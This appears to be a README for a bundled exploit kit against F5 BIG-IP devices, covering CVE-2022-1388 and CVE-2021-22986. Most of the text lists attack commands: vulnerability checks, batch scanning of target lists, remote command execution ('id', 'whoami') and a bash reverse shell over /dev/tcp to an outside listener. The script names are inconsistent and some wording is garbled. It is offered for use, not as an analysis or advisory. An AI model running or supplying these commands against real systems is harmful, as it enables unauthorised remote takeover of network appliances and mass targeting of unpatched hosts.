# 20221-2021-F5-BIG-IP-IQ-RCE
I modified it so you can use CVE-2022-1388/CVE-2021-22986 and F5 BIG-IP RCE vuln checks and exploiters
the normal check.py and exp.py is 2022 but CVE_2021, newpoc, and f5.rest.jar are from the 2021 version

but all you gotta do is do python check.py to see all cmds

<strong>2021 Basic use</strong>

-python3 CVE_2021.py
-Vuln check: python3 CVE_2021_22986.py -v true -u https://192.168.174.164
-command execute: python3 CVE_2021.py -a true -u https://192.168.174.164 -c id
-python3 CVE_2021.py -a true -u https://192.168.174.164 -c whoami
-batch scan: python3 CVE_2021_22986.py -s true -f url.txt
-Reserve Shell: python3 CVE_2021_22986.py -r true -u https://192.168.174.164 -c "bash -i >&/dev/tcp/192.168.174.129/8888 0>&1"
-New POC: python3 newpoc.py https://192.168.174.164
-Validation mode：python CVE_2021.py -v true -u target_url 
-Attack mode：python CVE_2021.py -a true -u target_url -c command 
-Batch detection：python CVE_2021.py -s true -f file
-Bounce mode：python CVE_2021.py -r true -u target_url -c command 

<strong>2022 Basic use</strong>
-Vulnerability name: F5 BIG-IP iControl Rest API exposed Check
-Function: single detection, batch detection                                    
-Single detection：python exp.py -u url
-Batch detection：python exp.py -f url.txt
-Check: python check.py -f url.txt
